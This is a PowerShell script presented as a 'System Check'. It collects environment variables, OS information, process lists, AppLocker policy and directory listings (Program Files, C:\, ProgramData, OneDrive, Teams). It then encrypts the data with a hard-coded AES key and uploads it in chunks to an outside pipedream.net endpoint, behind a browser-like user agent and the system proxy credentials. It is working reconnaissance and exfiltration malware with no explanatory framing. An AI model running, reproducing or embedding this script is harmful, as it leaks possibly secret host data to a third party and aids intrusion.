$initialisation = 'Checking system';
$taskUpdatingName='System Check';
$version='1.0.1';
$a=[System.Environment]::GetEnvironmentVariables()|%{$_ | out-string} -ErrorAction 'ignore';
$a=" === V === "+$a;
$b=wmic os get /value;
$b=" === SI === "+$b;
$c=dir C:/Program*/* -ErrorAction 'ignore';
$c=" === PF === "+$c;
$e=Get-Process | ft ProcessName,Product,ProductVersion,Description,MainWindowTitle,path -wrap |out-string -Width ([int]::MaxValue);
$e=" === TL === "+$e;
$f=dir C:/ -ErrorAction 'ignore';
$f=" === C === "+$f;
$g=Get-AppLockerPolicy -Effective -ErrorAction 'ignore';
$g=" === AL === "+$g;
$h=dir $env:programdata -ErrorAction 'ignore';
$h=" === PD === "+$h;
$i=dir $env:localappdata"\Microsoft\OneDrive" -ErrorAction 'ignore';
$i=" === OD === "+$i;
$j=dir $env:localappdata"\Microsoft\Teams\Current" -ErrorAction 'ignore';
$j=" === TE === "+$j;
$aesKey = (215, 125, 90, 62, 253, 202, 100, 68, 138, 91, 68, 197, 118, 242, 62, 90, 216, 141, 142, 224, 17, 216, 180, 167);
$chunk1 = $a+$b;
$chunk2 = $e;
$chunk3 = $c+$f+$g;
$chunk4 = $h+$i+$j;
$chunk1sec = ConvertTo-SecureString -String $chunk1 -AsPlainText -Force;
$chunk164 = ConvertFrom-SecureString -SecureString $chunk1sec -Key $aesKey;
$chunk2sec = ConvertTo-SecureString -String $chunk2 -AsPlainText -Force;
$chunk264 = ConvertFrom-SecureString -SecureString $chunk2sec -Key $aesKey;
$chunk3sec = ConvertTo-SecureString -String $chunk3 -AsPlainText -Force;
$chunk364 = ConvertFrom-SecureString -SecureString $chunk3sec -Key $aesKey;
$chunk4sec = ConvertTo-SecureString -String $chunk4 -AsPlainText -Force;
$chunk464 = ConvertFrom-SecureString -SecureString $chunk4sec -Key $aesKey;
$final = $chunk164+"---"+$chunk264+"---"+$chunk364+"----"+$chunk464;
$url = "https://19070b352d33b5b7bf7780ac83356512.m.pipedream.net";
$browser = New-Object System.Net.WebClient;
$browser.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 XXX");
$browser.Proxy = [System.Net.WebRequest]::DefaultWebProxy;
$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;
$maxSize = 400000;
$length = $final.Length;
$startIndex = 0;
while ($startIndex -lt $length)
{
    $remainingLength = $length - $startIndex;
    $currentPieceSize = [Math]::Min($maxSize, $remainingLength);
    $currentPiece = $final.Substring($startIndex, $currentPieceSize);
    $browser.UploadString($url, $currentPiece);
    $startIndex += $currentPieceSize;
}
